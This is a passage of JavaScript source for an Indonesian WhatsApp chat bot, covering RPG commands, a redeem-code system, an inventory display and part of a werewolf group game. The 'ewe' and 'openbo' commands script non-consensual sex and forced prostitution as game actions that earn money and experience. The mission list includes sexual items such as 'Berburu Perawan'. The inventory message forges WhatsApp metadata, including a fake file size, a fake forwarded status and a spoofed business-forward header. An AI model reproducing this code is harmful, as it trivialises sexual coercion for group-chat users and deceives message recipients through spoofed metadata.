      let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastewe)
      if (new Date() - global.db.erpg[m.sender].lastewe < 43200000) return m.reply(`Kamu Baru Saja ngwe, ${waktuu} Yang Lalu, ewe Lagi nanti.`)
      let uang = await randomNomor(3000, 19000)
      let exp = await randomNomor(3444, 7897)
      m.reply(`kamu membawa nya ke kamar dan membuka paksa baju nya...`)
      await sleep(3000)
      m.reply(`Ehh Mau Ngapainn 😣😣...`)
      await sleep(3000)
      m.reply(`Ahhh Pelan Pelann, Sakittt😖😖😖....\nAHHH...AHHHH...Pelan Pelan...😖😖😖`)
      await sleep(3000)
      m.reply(`Ahhhh, Sakitttt!! >////<\nPlok...Plokkk...Plokkkk😩😖`)
      await sleep(3000)
      m.reply(`😖Ahhhh.... Penuhhh.... Angettt😖`)
      await sleep(3000)
      m.reply(`*—[ Hasil Ewe ${db.users[m.sender].nama} ]—* 
➤ 💰 Uang = [ ${uang} ] 
➤ ✨ Exp = [ ${exp} ] 
➤ 🎗️ Tugas Selesai = +1`)
      db.users[m.sender].saldo += uang
      db.users[m.sender].exp += exp
      global.db.erpg[m.sender].lastewe = new Date * 1
    }
    break

    case 'open-bo':
    case 'openbo': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      if (global.db.erpg[m.sender].stamina < 1) return m.reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
      let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastopenbo)
      if (new Date() - global.db.erpg[m.sender].lastopenbo < 54000000) return m.reply(`Kamu Baru Saja ${command}, ${waktuu} Yang Lalu, Tunggu Lagi Setelah selesai.`)
      let uwong = ['Azril', 'Amba', 'MarkZukbrg', 'Mulyono', 'Andree']
      let userpname = pickRandom(uwong)
      let hotel = await randomNomor(3, 6)
      let uang = await randomNomor(7000, 34000)
      let expusr = await randomNomor(8000, 13000)
      let limit = await randomNomor(20, 80)
      let stamina = await randomNomor(45, 85)
      m.reply('Sedang Mencari Pelanggan...')
      await sleep(5000)
      m.reply(`Kamu Mendapatkan Pelanggan Bernama ${userpname} Dan Pergi Ke Hotel Bintang ${hotel}`)
      await sleep(4000)
      m.reply('Kamu Pun Mulai Melakukan Nganu Dengannya')
      await sleep(6000)
      m.reply('Kamu Di Paksa Untuk Melayaninya 24 Jam')
      await sleep(4000)
      m.reply(`Kamu Terbaring Lemas Karna Melakukan\nNgentod 24 Jam Dengan ${userpname},\nTetapi Kamu Mendapatkan : \n
Uang : ${uang}
Exp : ${expusr}
Limit : ${limit}

Stamina berkurang ${stamina}%`)
      db.users[m.sender].saldo += uang
      db.users[m.sender].exp += expusr
      db.users[m.sender].limit += limit
      global.db.erpg[m.sender].stamina -= stamina
      global.db.erpg[m.sender].lastopenbo = new Date * 1
    }
    break

    case 'daily-misi':
    case 'dailymisi': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      if (global.db.erpg[m.sender].stamina < 1) return m.reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
      let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastdailymisi)
      if (new Date() - global.db.erpg[m.sender].lastdailymisi < 86400000) return m.reply(`Kamu Baru Saja ${command}, ${waktuu} Yang Lalu, Tunggu Lagi Setelah selesai.`)
      let misiget = ['Menangkap 30 lalat dalam 30 detik', 'Ngentod Janda', 'Menangkap anomali', 'Menangkap Maling', 'Menangkap Buronan', 'Menangkap azril', 'Mengejar Ilham', 'Membunuh MarkZukberg', 'Membunuh Tuhan', 'Berburu Perawan']
      let mission = pickRandom(misiget)
      let uang = await randomNomor(7000, 34000)
      let expget = await randomNomor(8000, 13000)
      let limit = await randomNomor(20, 80)
      let stamina = await randomNomor(45, 85)
      m.reply('Mencari Misi...')
      await sleep(3000)
      m.reply(`Misi ${mission} Berhasil Didapatkan`)
      await sleep(4000)
      m.reply('Mengerjakan misi...')
      await sleep(10000)
      m.reply(`${sock.getName(m.sender)} Berhasil Menyelesaikan Misi
Dan Kamu Mendapatkan :
Uang : ${uang}
Exp : ${expget}
Limit : ${limit}

Sramina Berkurang ${stamina}%`)
      db.users[m.sender].saldo += uang
      db.users[m.sender].exp += expget
      db.users[m.sender].limit += limit
      global.db.erpg[m.sender].stamina -= stamina
      global.db.erpg[m.sender].lastdailymisi = new Date * 1
    }
    break

    case 'ngaji':
    case 'mengaji': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastngaji)
      if (new Date() - global.db.erpg[m.sender].lastngaji < 14400000) return m.reply(`Kamu Baru Saja ${command}, ${waktuu} Yang Lalu, Tunggu Lagi Setelah selesai.`)
      let uang = randomNomor(3000, 6000)
      let expget = randomNomor(3000, 5000)
      m.reply('Mencari Guru Ngaji....')
      await sleep(7000)
      m.reply('Ketemu ustadz..')
      await sleep(4000)
      m.reply('Diajarin tajwid')
      await sleep(3000)
      m.reply('Ngasih tau, kalo qalqalah itu dipantulkan')
      await sleep(3000)
      m.reply(`*—[ Hasil Ngaji ]—*
➕💹 Uang jajan: ${uang}
➕✨ Exp: ${expget}
➕🤬 Dimarahin: -1`)
      db.users[m.sender].saldo += uang
      db.users[m.sender].exp += expget
      global.db.erpg[m.sender].lastngaji = new Date * 1
    }
    break

    case 'skillcek':
    case 'cekskill': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      m.reply(`${global.db.erpg[m.sender].skillselect ? `Skill kamu : ${global.db.erpg[m.sender].skillselect}` : 'Kamu Belum Memiliki Skill'}`)
    }
    break

    case 'redem':
    case 'redeem': {

db.redeem = db.redeem || {
        isRedeem: false,
        code: "",
        user: [],
        maxRedeem: 0
      }
      if (!db.redeem.isRedeem) return m.reply('Tidak ada redeem yang di berikan')
      if (!text) return m.reply('Masukan kode!')
      if (db.redeem.isRedeem) {
        let code = text.toLowerCase()
        let redeem = db.redeem.code.toLowerCase()
        if (code !== redeem) return m.reply('Kode kamu gak valid!')
        if (db.redeem.maxRedeem < 1) return m.reply('Kode udah abiss cokk')
        if (db.redeem.user.includes(m.sender)) return m.reply('Kamu sudah claim kode ini!')
        let uang = await randomNomor(100000, 3000000)
        let expgt = await randomNomor(3000, 8000)
        let limiter = await randomNomor(1000, 5000)
        let glimiter = await randomNomor(1000, 7000)
        db.redeem.user.push(m.sender)
        db.redeem.maxRedeem -= 1
        db.users[m.sender].saldo += uang
        db.users[m.sender].exp += expgt
        db.users[m.sender].limit += limiter
        db.users[m.sender].glimit += glimiter
        let teks = `*CONGRATULATION 🥳*

*Kamu Mendapatkan* :
-  Rp ${toRupiah(uang)} Balance
-  ${expgt} Exp
-  ${limiter} Limit
-  ${glimiter} Game Limit`
        m.reply(teks)
        if (db.redeem.maxRedeem < 1) {
          await timeout(600000)
          delete db.redeem
        }
      } else {
        m.reply("*Gak ada redeem yang di berikan 😓*")
      }
    }
    break

    case 'redemset':
    case 'setredem':
    case 'redeemset':
    case 'setredeem': {

if (!isOwner) return onlyOwn()
      db.redeem = db.redeem || {
        isRedeem: false,
        code: "",
        user: [],
        maxRedeem: 0
      }
      if (!args[0]) return m.reply(`*Masukin Kode Redemnya!*\n\nContoh:\n${prefix + command} NewUpdate 10`)
      if (!args[1]) return m.reply(`*Masukin Jumlah Tersedia!*\n\nContoh:\n${prefix + command} NewUpdate 10`)
      if (isNaN(args[1])) return m.reply(`*Jumlah Harus Angka!*\n\nContoh:\n${prefix + command} NewUpdate 10`)
      db.redeem.isRedeem = true
      db.redeem.code = args[0]
      db.redeem.user = []
      db.redeem.maxRedeem = args[1]
      m.reply('Code Redeem, Berhasil Di Setting*')
    }
    break
    case 'delredeem':
    case 'redeemdel': {

if (!isOwner) return onlyOwn()
      db.redeem = db.redeem || {
        isRedeem: false,
        code: "",
        user: [],
        maxRedeem: 0
      }
      if (db.redeem.isRedeem) {
        m.reply('*Redeem Code Dihapus!*')
        delete db.redeem
      } else {
        m.reply('*Tidak ada sesi redeem*')
      }
    }
    break

    case 'listredem':
    case 'redemlist':
    case 'redeemlist':
    case 'listredeem': {

if (!isOwner) return onlyOwn()
      if (!db.redeem) return m.reply('Tidak ada data redeem')
      if (db.redeem.user.length === 0) return m.reply('Tidak ada nomor yang sudah redeem')
      let list = 'Daftar Nomor yang Sudah Redeem:\n\n'
      db.redeem.user.forEach((nomor, index) => {
        list += `${index + 1}. ${nomor}\n`
      })
      m.reply(list)
    }
    break

    case 'inv':
    case 'inventory': {

let {
        rank,
        rankid
      } = await ranke(m.sender);
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      
      let teks = `*⚔️ RPG - PROFILE ⚔️*

_*User Profile 🤺*_
  ${vircion} • Name: ${db.users[m.sender].nama}
  ${vircion} • Money: ${db.users[m.sender].saldo}
  ${vircion} • User Healthy: ${global.db.erpg[m.sender].darahuser}/100%
  ${vircion} • Skill: ${global.db.erpg[m.sender].skillselect ? `(${global.db.erpg[m.sender].skillselect})` : 'Nothing'}
  ${vircion} • Makanan: ${global.db.erpg[m.sender].makanan}
  ${vircion} • Potion: ${global.db.erpg[m.sender].potion}
  ${vircion} • Keberadaan: ${global.db.erpg[m.sender].wilayah}
  ${vircion} • Kapal: ${global.db.erpg[m.sender].kapal ? `(${global.db.erpg[m.sender].darahkapal}% HP)` : 'Nothing'}
  ${vircion} • Rumah: ${global.db.erpg[m.sender].rumah} Unit
  ${vircion} • Kapak: ${global.db.erpg[m.sender].kapak ? `(${global.db.erpg[m.sender].darahkapak}% HP)` : 'Nothing'}
  ${vircion} • Pickaxe: ${global.db.erpg[m.sender].pickaxe ? `(${global.db.erpg[m.sender].darahpickaxe}% HP)` : 'Nothing'}
  ${vircion} • Baju Zirah: ${global.db.erpg[m.sender].bzirah ? `(${global.db.erpg[m.sender].darahbzirah}% HP)` : 'Nothing'}
  ${vircion} • Pedang: ${global.db.erpg[m.sender].pedang ? `(${global.db.erpg[m.sender].darahpedang}% HP)` : 'Nothing'}
  ${vircion} • Kain: ${global.db.erpg[m.sender].kain} Lembar

_*Sumber Daya 🧰*_
  ${vircion} • Kayu: ${global.db.erpg[m.sender].kayu}
  ${vircion} • Besi: ${global.db.erpg[m.sender].besi}
  ${vircion} • Emas: ${global.db.erpg[m.sender].emas}
  ${vircion} • Perak: ${global.db.erpg[m.sender].perak}
  ${vircion} • Batubara: ${global.db.erpg[m.sender].batubara}
  ${vircion} • Emerald: ${global.db.erpg[m.sender].emerald}
  ${vircion} • Diamond: ${global.db.erpg[m.sender].diamond}
  ${vircion} • Common: ${global.db.erpg[m.sender].common}
  ${vircion} • Uncommon: ${global.db.erpg[m.sender].uncommon}
  ${vircion} • Mythic: ${global.db.erpg[m.sender].mythic}
  ${vircion} • Legendary: ${global.db.erpg[m.sender].legendary}

_*Hewan & Ternak🐄*_
  ${vircion} • Ayam: ${global.db.erpg[m.sender].ayam} Ekor 
  ${vircion} • Sapi: ${global.db.erpg[m.sender].sapi} Ekor
  ${vircion} • Domba: ${global.db.erpg[m.sender].domba} Ekor
  ${vircion} • Ikan: ${global.db.erpg[m.sender].ikan} Ekor
  ${vircion} • Banteng: ${global.db.erpg[m.sender].banteng} Ekor 
  ${vircion} • Gajah: ${global.db.erpg[m.sender].gajah} Ekor
  ${vircion} • Harimau: ${global.db.erpg[m.sender].harimau} Ekor
  ${vircion} • Kambing: ${global.db.erpg[m.sender].kambing} Ekor
  ${vircion} • Panda: ${global.db.erpg[m.sender].panda} Ekor
  ${vircion} • Buaya: ${global.db.erpg[m.sender].buaya} Ekor
  ${vircion} • Kerbau: ${global.db.erpg[m.sender].kerbau} Ekor
  ${vircion} • Monyet: ${global.db.erpg[m.sender].monyet} Ekor
  ${vircion} • Babihutan: ${global.db.erpg[m.sender].babihutan} Ekor
  ${vircion} • Babi: ${global.db.erpg[m.sender].babi} Ekor

_*Hewan Laut🌊*_
  ${vircion} • Ikan: ${global.db.erpg[m.sender].ikan} Ekor
  ${vircion} • Paus: ${global.db.erpg[m.sender].paus} Ekor
  ${vircion} • Gurita: ${global.db.erpg[m.sender].gurita} Ekor
  ${vircion} • Kepiting: ${global.db.erpg[m.sender].kepiting} Ekor
  ${vircion} • Cumi: ${global.db.erpg[m.sender].cumi} Ekor
  ${vircion} • Buntal: ${global.db.erpg[m.sender].buntal} Ekor
  ${vircion} • Dory: ${global.db.erpg[m.sender].dory} Ekor
  ${vircion} • Lumba: ${global.db.erpg[m.sender].lumba} Ekor
  ${vircion} • Lobster: ${global.db.erpg[m.sender].lobster} Ekor
  ${vircion} • Hiu: ${global.db.erpg[m.sender].hiu} Ekor
  ${vircion} • Udang: ${global.db.erpg[m.sender].udang} Ekor
  ${vircion} • Orca: ${global.db.erpg[m.sender].orca} Ekor
  
_*Buah Buahan🍇*_
  ${vircion} • Anggur: ${global.db.erpg[m.sender].anggur}
  ${vircion} • Jeruk: ${global.db.erpg[m.sender].jeruk}
  ${vircion} • Mangga: ${global.db.erpg[m.sender].mangga}
  ${vircion} • Pisang: ${global.db.erpg[m.sender].pisang}
  
_*Items Lainnya🎗️*_
  ${vircion} • Botol: ${global.db.erpg[m.sender].botol}
  ${vircion} • Kardus: ${global.db.erpg[m.sender].kardus}
  ${vircion} • Kaleng: ${global.db.erpg[m.sender].kaleng}
  ${vircion} • Gelas: ${global.db.erpg[m.sender].gelas}
  ${vircion} • Plastik: ${global.db.erpg[m.sender].plastik}
  ${vircion} • Bulu: ${global.db.erpg[m.sender].bulu}
  ${vircion} • Bibit Anggur: ${global.db.erpg[m.sender].bibitanggur}
  ${vircion} • Bibit Pisang: ${global.db.erpg[m.sender].bibitpisang}
  ${vircion} • Bibit Apel: ${global.db.erpg[m.sender].bibitapel}
  ${vircion} • Bibit Mangga: ${global.db.erpg[m.sender].bibitmangga}
  ${vircion} • Bibit Jeruk: ${global.db.erpg[m.sender].bibitjeruk}`
      await sock.sendMessage(
        m.chat, {
          document: {
            url: thumbnail
          },
          fileName: `${namaBot}`,
          fileLength: 100000000000000,
          pageCount: 2024,
          caption: teks,
          contextInfo: {
            mentionedJid: [sender],
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
              containsAutoReply: true,
              mediaType: 1,
              mediaUrl: ``,
              renderLargerThumbnail: true,
              showAdAttribution: true,
              sourceUrl: ``,
              thumbnailUrl: `${global.thumbnail2}`,
              title: `${namaBot}`,
              body: `${Waktu} kak`,
              mentionedJid: [sender],
              isForwarded: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: null + "@newsletter",
              newsletterName: `${namaBot}`,
              serverMessageId: 143
            },
            businessMessageForwardInfo: {
              businessOwnerJid: sock.decodeJid(sock.user.id)
            }
          },
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `.weekly`,
              buttonText: {
                displayText: 'Weekly'
              }
            },
            {
              buttonId: `.monthly`,
              buttonText: {
                displayText: 'Monthly'
              }
            }
          ],
          headerType: 6,
          viewOnce: true
        }, {
          quoted: fakeQuoted
        });
    }
    break

case 'ww':
    case 'werewolf': {

      let jimp = require("jimp")
      const resize = async (image, width, height) => {
        const read = await jimp.read(image);
        const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
        return data;
      };

      let {
        emoji_role,
        sesi,
        playerOnGame,
        playerOnRoom,
        playerExit,
        dataPlayer,
        dataPlayerById,
        getPlayerById,
        getPlayerById2,
        killWerewolf,
        killww,
        dreamySeer,
        sorcerer,
        protectGuardian,
        roleShuffle,
        roleChanger,
        roleAmount,
        roleGenerator,
        addTimer,
        startGame,
        playerHidup,
        playerMati,
        vote,
        voteResult,
        clearAllVote,
        getWinner,
        win,
        pagi,
        malam,
        skill,
        voteStart,
        voteDone,
        voting,
        run,
        run_vote,
        run_malam,
        run_pagi
      } = require('./lib/werewolf.js')

      // [ Thumbnail ] 
      let thumb =
        "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";

      const {
        sender,
        chat
      } = m;
      sock.werewolf = sock.werewolf ? sock.werewolf : {};
      const ww = sock.werewolf ? sock.werewolf : {};
      const data = ww[chat];
      const value = args[0];
      const target = args[1];

      // [ Membuat Room ]
      if (value === "create") {
        if (chat in ww) return m.reply("Group masih dalam sesi permainan");
        if (playerOnGame(sender, ww) === true)
          return m.reply("Kamu masih dalam sesi game");
        ww[chat] = {
          room: chat,
          owner: sender,
          status: false,
          iswin: null,
          cooldown: null,
          day: 0,
          time: "malem",
          player: [],
          dead: [],
          voting: false,
          seer: false,
          guardian: [],
        };
        await m.reply("Room berhasil dibuat, ketik *.ww join* untuk bergabung");

        // [ Join sesi permainan ]
      } else if (value === "join") {
        if (!ww[chat]) return m.reply("Belum ada sesi permainan");
        if (ww[chat].status === true)
          return m.reply("Sesi permainan sudah dimulai");
        if (ww[chat].player.length > 16)
          return m.reply("Maaf jumlah player telah penuh");
        if (playerOnRoom(sender, chat, ww) === true)
          return m.reply("Kamu sudah join dalam room ini");
        if (playerOnGame(sender, ww) === true)
          return m.reply("Kamu masih dalam sesi game");
        let data = {
          id: sender,
          number: ww[chat].player.length + 1,
          sesi: chat,
          status: false,
          role: false,
          effect: [],
          vote: 0,
          isdead: false,
          isvote: false,
        };
        ww[chat].player.push(data);
        let player = [];
        let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
        for (let i = 0; i < ww[chat].player.length; i++) {
          text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )}\n`;
          player.push(ww[chat].player[i].id);
        }
        text += "\nJumlah player minimal adalah 5 dan maximal 15";
        sock.sendMessage(
          m.chat, {
            text: text.trim(),
            contextInfo: {
              externalAdReply: {
                title: "W E R E W O L F",
                mediaType: 1,
                renderLargerThumbnail: true,
                thumbnail: await resize(thumb, 300, 175),
                sourceUrl: "",
                mediaUrl: thumb,
              },
              mentionedJid: player,
            },
          }, {
            quoted: fakeQuoted
          }
        );

        // [ Game Play ]
      } else if (value === "start") {
        if (!ww[chat]) return m.reply("Belum ada sesi permainan");
        if (ww[chat].player.length === 0)
          return m.reply("Room belum memiliki player");
        if (ww[chat].player.length < 5)
          return m.reply("Maaf jumlah player belum memenuhi syarat");
        if (playerOnRoom(sender, chat, ww) === false)
          return m.reply("Kamu belum join dalam room ini");
        if (ww[chat].cooldown > 0) {
          if (ww[chat].time === "voting") {
            clearAllVote(chat, ww);
            addTimer(chat, ww);
            return await run_vote(sock, chat, ww);
          } else if (ww[chat].time === "malem") {
            clearAllVote(chat, ww);
            addTimer(chat, ww);
            return await run_malam(sock, chat, ww);
          } else if (ww[chat].time === "pagi") {
            clearAllVote(chat, ww);
            addTimer(chat, ww);
            return await run_pagi(sock, chat, ww);
          }
        }
        if (ww[chat].status === true)
          return m.reply("Sesi permainan telah dimulai");
        if (ww[chat].owner !== sender)
          return m.reply(
            `Hanya @${ww[chat].owner.split("@")[0]} yang dapat memulai permainan`
          );
        let list1 = "";
        let list2 = "";
        let player = [];
        roleGenerator(chat, ww);
        addTimer(chat, ww);
        startGame(chat, ww);
        for (let i = 0; i < ww[chat].player.length; i++) {
          list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")}\n`;
          player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
          list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")} ${
          ww[chat].player[i].role === "werewolf" ||
          ww[chat].player[i].role === "sorcerer"
            ? `[${ww[chat].player[i].role}]`
            : ""
        }\n`;
          player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
          // [ Werewolf ]
          if (ww[chat].player[i].role === "werewolf") {
            if (ww[chat].player[i].isdead != true) {
              var textt = `Hai ${sock.getName(
              ww[chat].player[i].id
            )}, Kamu telah dipilih untuk memerankan *Werewolf* ${emoji_role(
              "werewolf"
            )} pada permainan kali ini, silahkan pilih salah satu player yang ingin kamu makan pada malam hari ini\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc kill nomor* untuk membunuh player`;

              let row = [];
              for (let p = 0; p < ww[chat].player.length; p++) {
                row.push({
                  title: `Kill Player ${ww[chat].player[p].number}`,
                  rowId: `.wwpc kill ${ww[chat].player[p].number}`,
                  description: `Untuk membunuh player ${ww[chat].player[p].number}`,
                });
              }
              const sections = [{
                title: "⌂ W E R E W O L F - G A M E",
                rows: row
              }, ];
              const listMessage = {
                text: text,
                footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                title: "⌂ W E R E W O L F - G A M E\n",
                buttonText: "Clik here!",
                sections,
                mentions: player,
              };
              await sock.sendMessage(ww[chat].player[i].id, listMessage);

              await sock.sendMessage(ww[chat].player[i].id, {
                text: textt,
                mentions: player,
              });
            }

            // [ villager ]
          } else if (ww[chat].player[i].role === "warga") {
            if (ww[chat].player[i].isdead != true) {
              let texttt = `*⌂ W E R E W O L F - G A M E*\n\nHai ${sock.getName(
              ww[chat].player[i].id
            )} Peran kamu adalah *Warga Desa* ${emoji_role(
              "warga"
            )}, tetap waspada, mungkin *Werewolf* akan memakanmu malam ini, silakan masuk kerumah masing masing.\n*LIST PLAYER*:\n${list1}`;
              await sock.sendMessage(ww[chat].player[i].id, {
                text: texttt,
                mentions: player,
              });
            }

            // [ Penerawangan ]
          } else if (ww[chat].player[i].role === "seer") {
            if (ww[chat].player[i].isdead != true) {
              let texxt = `Hai ${sock.getName(
              ww[chat].player[i].id
            )} Kamu telah terpilih  untuk menjadi *Penerawang* ${emoji_role(
              "seer"
            )}. Dengan sihir yang kamu punya, kamu bisa mengetahui peran pemain pilihanmu.\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc dreamy nomor* untuk melihat role player`;

              let row = [];
              for (let p = 0; p < ww[chat].player.length; p++) {
                row.push({
                  title: `Cek Player ${ww[chat].player[p].number}`,
                  rowId: `.ww dreamy ${ww[chat].player[p].number}`,
                  description: `Untuk melihat identitas player ${ww[chat].player[p].number}`,
                });
              }
              const sections = [{
                title: "⌂ W E R E W O L F - G A M E",
                rows: row
              }, ];
              const listMessage = {
                text: text,
                footer: `Player Hidup: ${playerHidup(
                         sesi(m.chat, ww)
                       )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                title: "⌂ W E R E W O L F - G A M E\n",
                buttonText: "Clik here!",
                sections,
                mentions: player,
              };
              await sock.sendMessage(ww[chat].player[i].id, listMessage);

              await sock.sendMessage(ww[chat].player[i].id, {
                text: texxt,
                mentions: player,
              });
            }
          } else if (ww[chat].player[i].role === "guardian") {
            if (ww[chat].player[i].isdead != true) {
              let teext = `Hai ${sock.getName(
              ww[chat].player[i].id
            )} Kamu terpilih untuk memerankan *Malaikat Pelindung* ${emoji_role(
              "guardian"
            )}, dengan kekuatan yang kamu miliki, kamu bisa melindungi para warga, silahkan pilih salah 1 player yang ingin kamu lindungi\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc deff nomor* untuk melindungi player`;

              let row = [];
              for (let p = 0; p < ww[chat].player.length; p++) {
                row.push({
                  title: `Lindungi Player ${ww[chat].player[p].number}`,
                  rowId: `.ww deff ${ww[chat].player[p].number}`,
                  description: `Untuk melindungi player ${ww[chat].player[p].number}`,
                });
              }
              const sections = [{
                title: "⌂ W E R E W O L F - G A M E",
                rows: row
              }, ];
              const listMessage = {
                text: text,
                footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                title: "⌂ W E R E W O L F - G A M E\n",
                buttonText: "Clik here!",
                sections,
                mentions: player,
              };
              await sock.sendMessage(ww[chat].player[i].id, listMessage);

              await sock.sendMessage(ww[chat].player[i].id, {
                text: teext,
                mentions: player,
              });
            }

            // [ Sorcerer ]
          } else if (ww[chat].player[i].role === "sorcerer") {
            if (ww[chat].player[i].isdead != true) {
              let textu = `Hai ${sock.getName(
              ww[chat].player[i].id
            )} Kamu terpilih sebagai Penyihir ${emoji_role(
              "sorcerer"
            )}, dengan kekuasaan yang kamu punya, kamu bisa membuka identitas para player, silakan pilih 1 orang yang ingin kamu buka identitasnya\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc sorcerer nomor* untuk melihat role player`;

              let row = [];
              for (let p = 0; p < ww[chat].player.length; p++) {
                row.push({
                  title: `Cek Player ${ww[chat].player[p].number}`,
                  rowId: `.ww sorcerer ${ww[chat].player[p].number}`,
                  description: `Untuk melihat identitas player ${ww[chat].player[p].number}`,
                });
              }
              const sections = [{
                title: "⌂ W E R E W O L F - G A M E",
                rows: row
              }, ];
              const listMessage = {
                text: text,
                footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                title: "⌂ W E R E W O L F - G A M E\n",
                buttonText: "Clik here!",
                sections,
                mentions: player,
              };
              await sock.sendMessage(ww[chat].player[i].id, listMessage);

              await sock.sendMessage(ww[chat].player[i].id, {
                text: textu,
                mentions: player,
              });
            }
          }
        }
        await sock.sendMessage(m.chat, {
          text: "*⌂ W E R E W O L F - G A M E*\n\nGame telah dimulai, para player akan memerankan perannya masing masing, silahkan cek chat pribadi untuk melihat role kalian. Berhati-hatilah para warga, mungkin malam ini adalah malah terakhir untukmu",
          contextInfo: {
            externalAdReply: {
              title: "W E R E W O L F",
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnail: await resize(thumb, 300, 175),
              sourceUrl: "",
              mediaUrl: thumb,
            },
            mentionedJid: player,
          },
        });
        await run(sock, chat, ww);
      } else if (value === "vote") {
        if (!ww[chat]) return m.reply("Belum ada sesi permainan");
        if (ww[chat].status === false)
          return m.reply("Sesi permainan belum dimulai");
        if (ww[chat].time !== "voting")
          return m.reply("Sesi voting belum dimulai");
        if (playerOnRoom(sender, chat, ww) === false)
          return m.reply("Kamu bukan player");
        if (dataPlayer(sender, ww).isdead === true)
          return m.reply("Kamu sudah mati");
        if (!target || target.length < 1)
          return m.reply("Masukan nomor player");
        if (isNaN(target)) return m.reply("Gunakan hanya nomor");
        if (dataPlayer(sender, ww).isvote === true)
          return m.reply("Kamu sudah melakukan voting");
        b = getPlayerById(chat, sender, parseInt(target), ww);
        if (b.db.isdead === true)
          return m.reply(`Player ${target} sudah mati.`);
        if (ww[chat].player.length < parseInt(target))
          return m.reply("Invalid");
        if (getPlayerById(chat, sender, parseInt(target), ww) === false)
          return m.reply("Player tidak terdaftar!");
        vote(chat, parseInt(target), sender, ww);
        return m.reply("✅ Vote");
      } else if (value == "exit") {
        if (!ww[chat]) return m.reply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
          return m.reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].status === true)
          return m.reply("Permainan sudah dimulai, kamu tidak bisa keluar");
        m.reply(`@${sender.split("@")[0]} Keluar dari permainan`, {
          withTag: true,
        });
        playerExit(chat, sender, ww);
      } else if (value === "delete") {
        if (!ww[chat]) return m.reply("Tidak ada sesi permainan");
        if (ww[chat].owner !== sender)
          return m.reply(
            `Hanya @${
            ww[chat].owner.split("@")[0]
          } yang dapat menghapus sesi permainan ini`
          );
        m.reply("Sesi permainan berhasil dihapus").then(() => {
          delete ww[chat];
        });
      } else if (value === "player") {
        if (!ww[chat]) return m.reply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
          return m.reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].player.length === 0)
          return m.reply("Sesi permainan belum memiliki player");
        let player = [];
        let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
        for (let i = 0; i < ww[chat].player.length; i++) {
          text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )} ${
          ww[chat].player[i].isdead === true
            ? `☠️ ${ww[chat].player[i].role}`
            : ""
        }\n`;
          player.push(ww[chat].player[i].id);
        }
        sock.sendMessage(
          m.chat, {
            text: text,
            contextInfo: {
              externalAdReply: {
                title: "W E R E W O L F",
                mediaType: 1,
                renderLargerThumbnail: true,
                thumbnail: await resize(thumb, 300, 175),
                sourceUrl: "",
                mediaUrl: thumb,
              },
              mentionedJid: player,
            },
          }, {
            quoted: fakeQuoted
          }
        );
      } else {
        let text = `\n*⌂ W E R E W O L F - G A M E*\n\nPermainan Sosial Yang Berlangsung Dalam Beberapa Putaran/ronde. Para Pemain Dituntut Untuk Mencari Seorang Penjahat Yang Ada Dipermainan. Para Pemain Diberi Waktu, Peran, Serta Kemampuannya Masing-masing Untuk Bermain Permainan Ini\n\n*⌂ C O M M A N D*\n`;
        text += ` • ww create\n`;
        text += ` • ww join\n`;
        text += ` • ww start\n`;
        text += ` • ww exit\n`;
        text += ` • ww delete\n`;
        text += ` • ww player\n`;
        text += `\nPermainan ini dapat dimainkan oleh 5 sampai 15 orang.`;
        sock.sendMessage(
          m.chat, {
            text: text.trim(),
            contextInfo: {
